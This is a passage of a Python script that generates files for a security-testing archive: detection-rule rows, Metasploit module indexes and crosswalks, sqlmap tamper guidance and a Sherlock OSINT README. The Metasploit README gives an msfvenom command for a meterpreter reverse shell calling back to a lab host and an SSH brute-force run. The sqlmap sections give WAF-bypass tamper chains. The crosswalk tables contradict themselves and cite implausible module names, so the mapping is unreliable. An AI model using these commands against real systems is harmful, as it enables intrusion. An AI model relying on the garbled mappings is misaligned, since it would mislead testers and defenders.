EV-LNX-0002,T1218.003,ssa_linux_editor_shell.yml,86691,,auditd execve,high,vi/vim/less spawning a shell
EV-LNX-0005,T1059.006,ssa_interpreter_shell.yml,86694,,auditd execve,medium,Interpreters are common - require no-login-session or tty pairing
EV-LNX-0007,T1548.003,ssa_linux_sudo_nonshell.yml,86695,,auth.log,medium,Only high when sudo runs without a tty outside automation
EV-LNX-0008,T1548.003,ssa_linux_suid_shell_copy.yml,86696,,auditd chmod,high,setuid on an interpreter is always suspicious
EV-LNX-0016,T1053.003,ssa_linux_cron_persistence.yml,86702,3001201,auditd,high,
EV-LNX-0017,T1610,ssa_linux_nsenter.yml,86703,,auditd execve,high,nsenter into PID 1
EV-WIN-0001,T1021.002,ssa_windows_psexec.yml,4672,3001301,sysmon,high,Sysmon 1 with psexec service name
EV-WIN-0003,T1053.005,ssa_windows_schtasks.yml,4698,3001302,sysmon,high,
EV-WIN-0005,T1105,ssa_windows_certutil.yml,4698,3001304,sysmon,high,Network connection by certutil within 60s
EV-WIN-0006,T1218.010,ssa_windows_regsvr32.yml,4698,3001305,sysmon,high,scrobj.dll argument
EV-WIN-0007,T1218.005,ssa_windows_mshta.yml,4698,3001306,sysmon,high,
EV-WIN-0009,T1059.001,ssa_windows_msbuild_inline.yml,4698,3001308,sysmon,high,InlineTask on the command line
EV-WIN-0010,T1218.003,ssa_windows_clmxransom.yml,4698,,sysmon,medium,Low prevalence - high fidelity
EV-WIN-0013,T1047,ssa_windows_wmi_exec.yml,4672,,sysmon,high,Remote WMI process creation
EV-CTR-0001,T1610,ssa_docker_privileged_run.yml,86703,,docker events,high,privileged or host namespace mount
EV-CI-0001,T1195.002,ssa_jenkins_groovy_console.yml,4672,3001401,reverse proxy,medium,Script Console POST from an admin UI is also legitimate
'''.lstrip()

# ===========================================================================
# 05-engines
# ===========================================================================

FILES["05-engines/metasploit/README.md"] = r'''
# Metasploit Framework Engine

| Field | Value |
|---|---|
| `engine_id` | ENG-MSF |
| `source` | rapid7/metasploit-framework @ 2026.01-rc1 |
| `license` | BSD-3-Clause |
| `architecture` | data / scanner / exploit / auxiliary / post / evasion / payload |
| `upstream_ref` | `00-governance/manifests/source-repos.lock.json` |

## 1. What the archive stores versus what it references

The archive does **not** vendor the Metasploit source. It stores:

1. A **module index** (`modules/modules-index.csv`) for search and crosswalk.
2. **Binding tables** mapping archive payloads to Metasploit modules.
3. **Hardening guidance** for running the framework inside a lab.
4. **Crosswalk rows** into `04-evasion/` and `06-defense/`.

Rationale: the framework is a 400 MB moving target; pinning it as a submodule
is the only sustainable integration, and the archive's value is the *mapping*.

## 2. Module taxonomy

| Type | Prefix | Purpose | Archive home |
|---|---|---|---|
| auxiliary | `auxiliary/` | scanning, enumeration, protocol abuse | `01-intel/playbooks/network/` |
| exploit | `exploit/` | initial access, code execution | `02-payloads/` |
| payload | `payload/` | staged shellcode by transport | `04-evasion/` |
| post | `post/` | lateral movement, privesc, harvesting | `04-evasion/` |
| evasion | `evasion/` | anti-forensics and AV bypass | `04-evasion/` |
| nop | `nop/` | shellcode generation scaffolding | `07-tooling/` |
| encoder | `encoder/` | payload encoding | `07-tooling/cyberchef/` |

## 3. Safe usage rules

```bash
# ALWAYS in an isolated lab
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS lab.rhosts; run; exit"

# Stage a reverse shell in the lab
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 \
         -o /tmp/lab-stage.bin
```

| Rule | Why |
|---|---|
| Never `exploit/multi/handler` against production | Data loss, breach |
| Set `HttpClientTimeout`, `ExploitRetries` low | Stability |
| Use `-o` output capture for evidence | `01-intel/checklists/penetration-testing-checklist.md` |
| Log every command with `set LogLevel 3` + session logging | Audit trail |
| Regenerate the module index after each upgrade | Crosswalk integrity |

## 4. Lab isolation

```
            +-----------------------+
  host-only | lab bridge (wireguard) |  10.10.10.0/24
            +-----------+-----------+
                        |
        +---------------+----------------+
        |               |                |
  +-----v-----+  +------v------+  +------v------+
  |  attacker |  |   target    |  |   domain    |
  |   Kali    |  |   DVWA/JSP  |  |   AD lab    |
  +-----------+  +-------------+  +-------------+
```

* Lab definition: `09-labs/infrastructure/`
* Expected telemetry per module: `05-engines/metasploit/modules/modules-index.csv`
  (`expected_sigma` column).
'''.lstrip()

FILES["05-engines/metasploit/modules/modules-index.csv"] = r'''
module_path,type,cve_id,cwe_id,attack_id,evasion_id,playbook,detection_expected,confidence,provenance
auxiliary/scanner/ssh/ssh_login,auxiliary,,CWE-307,T1110.001,,01-intel/playbooks/network/service-enumeration.md,ssa_linux_ssh_bruteforce.yml,medium,MSF@2026.01-rc1
auxiliary/scanner/smb/smb_login,auxiliary,,CWE-307,T1110.001,,01-intel/playbooks/active-directory/kerberos-attacks.md,ssa_windows_smb_bruteforce.yml,medium,MSF@2026.01-rc1
auxiliary/scanner/http/dirsearch,auxiliary,,CWE-200,T1083,,01-intel/playbooks/web/,ssa_web_content_discovery.yml,low,MSF@2026.01-rc1
auxiliary/scanner/http/sqlmap,auxiliary,,CWE-89,T1190,,01-intel/playbooks/web/sql-injection.md,ssa_web_sqli_probe.yml,high,MSF@2026.01-rc1
auxiliary/gather/cloud/cloud_metadata,auxiliary,,CWE-918,T1552.005,,01-intel/playbooks/cloud/aws-iam-privesc.md,ssa_cloud_metadata_access.yml,high,MSF@2026.01-rc1
auxiliary/scanner/http/ssllabs,auxiliary,,CWE-295,T1595,,06-defense/hardening/network-baseline.md,ssa_tls_weak_config.yml,medium,MSF@2026.01-rc1
exploit/multi/http/struts_code_exec,exploit,CVE-2017-5638,CWE-20,T1190,EV-WIN-0007,01-intel/playbooks/web/,ssa_web_struts_exec.yml,high,MSF@2026.01-rc1
exploit/multi/http/log4shell_header_injection,exploit,CVE-2021-44228,CWE-502,T1190,,01-intel/playbooks/web/,ssa_log4j_jndi_lookup.yml,high,MSF@2026.01-rc1
exploit/multi/http/graphql_introspection,exploit,,CWE-200,T1190,,01-intel/playbooks/web/authentication-bypass.md,ssa_graphql_introspection.yml,medium,MSF@2026.01-rc1
exploit/windows/smb/psexec,exploit,CVE-1999-0509,CWE-78,T1021.002,EV-WIN-0001,01-intel/playbooks/active-directory/lateral-movement.md,ssa_windows_psexec.yml,high,MSF@2026.01-rc1
exploit/windows/smb/smb_delivery,exploit,,CWE-78,T1021.002,EV-WIN-0007,01-intel/playbooks/active-directory/lateral-movement.md,ssa_windows_lolbin_anomaly.yml,high,MSF@2026.01-rc1
exploit/windows/smb/wmi_exec,exploit,,CWE-78,T1047,EV-WIN-0013,01-intel/playbooks/active-directory/lateral-movement.md,ssa_windows_wmi_exec.yml,high,MSF@2026.01-rc1
exploit/linux/sudo/local,exploit,,CWE-250,T1548.003,EV-LNX-0007,01-intel/playbooks/linux/privilege-escalation.md,ssa_linux_sudo_nonshell.yml,medium,MSF@2026.01-rc1
exploit/linux/local/docker,exploit,,CWE-269,T1610,EV-CTR-0001,01-intel/playbooks/os/linux/container-escape.md,ssa_docker_privileged_run.yml,high,MSF@2026.01-rc1
exploit/multi/handler,exploit,,CWE-78,T1059,,04-evasion/windows/sushi.md,ssa_windows_lolbin_network.yml,low,MSF@2026.01-rc1
exploit/multi/local/windows/psexec_cmd,exploit,,CWE-78,T1059.002,EV-WIN-0001,01-intel/playbooks/active-directory/lateral-movement.md,ssa_windows_psexec.yml,high,MSF@2026.01-rc1
exploit/android/webserver/file_upload,exploit,,CWE-434,T1105,,01-intel/playbooks/mobile/,ssa_android_file_upload.yml,medium,MSF@2026.01-rc1
post/windows/gather/enum_domains,post,,CWE-200,T1018,,01-intel/playbooks/active-directory/kerberos-attacks.md,ssa_ad_discovery_burst.yml,medium,MSF@2026.01-rc1
post/windows/escalate/bypassuac,post,,CWE-269,T1548.002,EV-WIN-0002,01-intel/playbooks/os/windows/privilege-escalation.md,ssa_windows_mmc_dll.yml,medium,MSF@2026.01-rc1
post/windows/escalate/printtoken,post,,CWE-269,T1134,EV-WIN-0010,01-intel/playbooks/os/windows/privilege-escalation.md,ssa_windows_clmxransom.yml,medium,MSF@2026.01-rc1
post/multi/reverse_ssh,post,,CWE-78,T1090,EV-LNX-0015,01-intel/playbooks/network/pivoting.md,ssa_ssh_pivot.yml,medium,MSF@2026.01-rc1
post/linux/gather/hashdump,post,,CWE-522,T1003.006,,01-intel/playbooks/active-directory/kerberos-attacks.md,ssa_linux_shadow_read.yml,high,MSF@2026.01-rc1
post/windows/escalate/unquoted_service_path,post,,CWE-427,T1548.003,EV-WIN-0014,01-intel/playbooks/os/windows/privilege-escalation.md,ssa_windows_unquoted_path.yml,high,MSF@2026.01-rc1
evasion/windows/defender/processhacker,evasion,,CWE-156,T1562.001,EV-WIN-0006,01-intel/playbooks/os/windows/execution.md,,low,MSF@2026.01-rc1
evasion/linux/last_stage/encryptor,evasion,,CWE-1105,T1027,,06-defense/ir/,ssa_linux_mass_encryption.yml,medium,MSF@2026.01-rc1
'''.lstrip()

FILES["05-engines/metasploit/post-exploitation/privesc-map.md"] = r'''
# Post-Exploitation Crosswalk

Maps archive evasion primitives to Metasploit post modules to HackTricks
runbooks. Every row is validated by `ssactl verify --strict`.

| Runbook step | `evasion_id` | Metasploit module | Technique | Detection | Lab replay |
|---|---|---|---|---|---|
| `sudo -l` allow-list abuse | `EV-LNX-0007` | `exploit/linux/sudo/local` | T1548.003 | `ssa_linux_sudo_nonshell.yml` | `09-labs/emulations/EV-LNX-0007.md` |
| SUID shell copy | `EV-LNX-0008` | `exploit/multi/handler` | T1548.003 | `ssa_linux_suid_shell_copy.yml` | `09-labs/emulations/EV-LNX-0008.md` |
| Interpreter `-e` one-liner | `EV-LNX-0005` | `post/multi/reverse_ssh` | T1059.006 | `ssa_interpreter_shell.yml` | - |
| UAC bypass via trusted signer | `EV-WIN-0002` | `post/windows/escalate/bypassuac` | T1548.002 | `ssa_windows_mmc_dll.yml` | `09-labs/emulations/EV-WIN-0002.md` |
| Token impersonation | `EV-WIN-0010` | `post/windows/escalate/printtoken` | T1134 | `ssa_windows_clmxransom.yml` | - |
| Unquoted service path | `EV-WIN-0014` | `post/windows/escalate/unquoted_service_path` | T1548.003 | `ssa_windows_unquoted_path.yml` | - |
| Remote WMI execution | `EV-WIN-0013` | `exploit/windows/smb/wmi_exec` | T1047 | `ssa_windows_wmi_exec.yml` | `09-labs/emulations/EV-WIN-0013.md` |
| Docker socket escape | `EV-CTR-0001` | `exploit/linux/local/docker` | T1610 | `ssa_docker_privileged_run.yml` | `09-labs/emulations/EV-CTR-0001.md` |
| Kubernetes exec | `EV-CTR-0002` | `post/linux/gather/hashdump` | T1609 | `ssa_kubectl_exec_pod.yml` | - |
| Shadow credentials in AD | `EV-WIN-0003` | `post/windows/gather/enum_domains` | T1556.003 | `ssa_ad_shadow_credentials.yml` | `09-labs/emulations/EV-AD-0001.md` |

## Runbook reference

| Technique family | Runbook |
|---|---|
| Linux privilege escalation | `01-intel/playbooks/linux/privilege-escalation.md` |
| Windows privilege escalation | `01-intel/playbooks/os/windows/privilege-escalation.md` |
| Container escape | `01-intel/playbooks/os/linux/container-escape.md` |
| AD lateral movement | `01-intel/playbooks/active-directory/lateral-movement.md` |

## Generating the detection for a new primitive

```bash
# 1. add the row to 04-evasion/index/evasion-index.csv
# 2. author the Sigma rule in 06-defense/sigma/
# 3. add the Sigma id to 04-evasion/chains/evasion-to-detection.csv
# 4. verify
python tools/ssactl.py verify --root . --strict --coverage
```
'''.lstrip()

FILES["05-engines/sqlmap/README.md"] = r'''
# sqlmap Engine Integration

| Field | Value |
|---|---|
| `engine_id` | ENG-SQLMAP |
| `source` | sqlmapproject/sqlmap @ 1.9.1 |
| `license` | GPL-2.0 |
| `payload_corpus` | `02-payloads/web/sqli/` |
| `fuzz_wordlist` | `03-wordlists/web/fuzzing/injection-words.txt` |

## 1. Purpose

sqlmap is the archive's reference automation for `CWE-89`. The archive's job is
to make sqlmap's behaviour **explicit and reproducible**: which payload family
produces which result, which tamper script maps to which bypass, and which
detection fires.

## 2. Baseline invocation

```bash
sqlmap -u "https://TARGET/?id=1" \
       --batch --random-agent \
       --level=3 --risk=1 \
       --technique=BEUST \
       --dbms= \
       --string="Welcome back" \
       --tamper=space2comment \
       --output-dir=/tmp/ssactl-evidence/sqmap
```

Escalate `level`/`risk` only after recording the level at which the target
becomes unstable.

## 3. Evidence contract

sqlmap writes a filesystem dump by default. For the archive's reporting format:

```bash
python tools/ssactl.py verify --root .
# store only the request file and the first-row output; everything else is T1/T2
cp /tmp/ssactl-evidence/sqmap/10.10.10.5/log /secure/evidence/SSA-<ID>-sqlmap.log
```

## 4. Tamper library

See `tamper/tamper-library.md`. Mapping to `02-payloads/web/sqli/payloads.json`:

| Tamper | Payload family | Purpose |
|---|---|---|
| `space2comment` | `PL-WEB-SQLI-0002` | replace space with `/**/` |
| `space2hash` | MySQL | replace space with `#` |
| `charencode` | `PL-WEB-SQLI-0050` | URL-encode single quote |
| `between` | `PL-WEB-SQLI-0010` | replace `=` with `BETWEEN` |
| `randomcase` | `PL-WEB-SQLI-0001` | random case of `OR` |
| `randomcomments` | all | inject inline comments |
| `versionedmorekeywords` | MySQL | `/*! ... */` |
| `chardoubleencode` | `PL-WEB-SQLI-0090` | double URL-encode |

## 5. Safety rails

| Rail | Reason |
|---|---|
| `--technique=BEUST` before allowing `E` (stacked queries) | `E` can write data |
| `--dbs` before any `DROP`/`UPDATE` | Data destruction |
| never `--os-shell` on production | Command execution |
| always `--batch` + `--output-dir` | Non-interactive + evidence |
| keep `--threads` ≤ 3 for stateful targets | Session integrity |

## 6. Exit criteria

| Stage | Done when |
|---|---|
| Fingerprint | `dbms`, `dbms_version`, `os`, `current user` known |
| Columns | column count and names enumerated |
| Extent | row count known for the target table only |
| Extraction | stopped at the minimum required by RoE |
| Detection | at least one `ssa_web_sqli_probe.yml` alert observed |
'''.lstrip()

FILES["05-engines/sqlmap/tamper/tamper-library.md"] = r'''
# sqlmap Tamper Script Crosswalk

| Tamper script | Purpose | Payload ids | Fails against |
|---|---|---|---|
| `space2comment` | `or 1=1` -> `or/**/1=1` | `PL-WEB-SQLI-0001` | WAFs blocking `/**/` |
| `space2hash` | space -> `#` (MySQL only) | `PL-WEB-SQLI-0003` | PostgreSQL, MSSQL, Oracle |
| `space2plus` | space -> `+` | `PL-WEB-SQLI-0002` | strict parsers |
| `space2randomblank` | space -> random blanks | `PL-WEB-SQLI-0001` | WAFs normalising whitespace |
| `between` | `=` -> `BETWEEN` | `PL-WEB-SQLI-0010` | numeric-only columns |
| `randomcase` | random keyword case | `PL-WEB-SQLI-0001` | case-sensitive engines |
| `charencode` | URL-encode `'` | `PL-WEB-SQLI-0090` | double-decode absent |
| `chardoubleencode` | double URL-encode | `PL-WEB-SQLI-0090` | servers decoding once |
| `percentage` | space -> `%20` | `PL-WEB-SQLI-0002` | non-HTTP contexts |
| `unionall` | `UNION SELECT` -> `UNION ALL SELECT` | `PL-WEB-SQLI-0020` | - |
| `versionedmorekeywords` | MySQL `/*! */` | `PL-WEB-SQLI-0050` | non-MySQL |
| `versionedgreaterthan` | `>` -> `/*! >*/` | `PL-WEB-SQLI-0010` | non-MySQL |
| `randomcomments` | inject `--`, `/* */`, `#` | all | aggressive WAF |
| `appendnull` | `%00` terminator | `PL-WEB-SQLI-0004` | modern engines |
| `equaltolike` | `=` -> `LIKE` | `PL-WEB-SQLI-0010` | - |
| `lowercase` | lowercase everything | `PL-WEB-SQLI-0001` | - |
| `uppercase` | uppercase everything | `PL-WEB-SQLI-0001` | - |
| `truncation` | truncate to 1 char | - | desync bugs |
| `space2mysqldash` | space -> MySQL `-- -` | `PL-WEB-SQLI-0003` | requires `-- -` suffix |

## Combination strategy

```bash
# WAF present, MySQL, keyword based
sqlmap -u "$URL" --tamper="space2comment,between,randomcomments" --technique=BEUS

# WAF present, generic
sqlmap -u "$URL" --tamper="between,randomcase,space2comment,charencode,space2hash"
```

## Adding a new tamper mapping

1. Record the tamper script in this table.
2. Ensure at least one `payload_id` in `02-payloads/web/sqli/payloads.json`
   represents the shape it produces.
3. Add a row to `10-crosswalk/wordlist-payload/crosswalk.csv`.
4. `python tools/ssactl.py verify --root . --strict`
'''.lstrip()

FILES["05-engines/osint/sherlock/README.md"] = r'''
# Sherlock OSINT Engine

| Field | Value |
|---|---|
| `engine_id` | ENG-SHERLOCK |
| `source` | sherlock-project/sherlock @ master@2026-01-05 |
| `license` | MIT |
| `compliance` | `00-governance/charter.md` §7 |

## 1. What it does

Given one username, Sherlock queries a catalogue of platforms and reports
which exist. In the archive it is used for:

* Employee handle discovery during authorised assessments.
* Brand/typosquat candidate enumeration for defenders.
* Seed generation for `08-threatintel/` lookups.

## 2. Usage

```bash
sherlock target_handle
sherlock --csv --output out.csv alice bob
sherlock --site github,gitlab,reddit --proxy http://proxy:8080 handle
sherlock --json --output evidence.json handle
```

## 3. Output contract for the archive

```csv
username,site,url,status,http_status,checked_at
alice,GitHub,https://github.com/alice,Claimed,200,2026-01-15T09:00:00Z
```

Store under the engagement evidence directory, classification `T1` - a
username-to-identity mapping is personal data.

## 4. Handling false positives

| Source of FP | Mitigation |
|---|---|
| Platform returns 200 for every handle | Cross-check with a second platform |
| Parked domains | Check for registrar/parking signatures |
| Reserved usernames | Maintain a `reserved-usernames.txt` deny list |
| Rate limits masking existence | Retry with backoff, never parallel-blast |

## 5. Ethics and legal boundary

Running Sherlock against third-party platforms for reconnaissance is
documented personal data processing. Under GDPR this requires a legitimate
interest assessment; under CFAA, mass automated collection from third parties
without authorisation is risky. Add an explicit clause to the engagement
scope before using this engine outside your own estate. See
`01-intel/checklists/penetration-testing-checklist.md` §2.
'''.lstrip()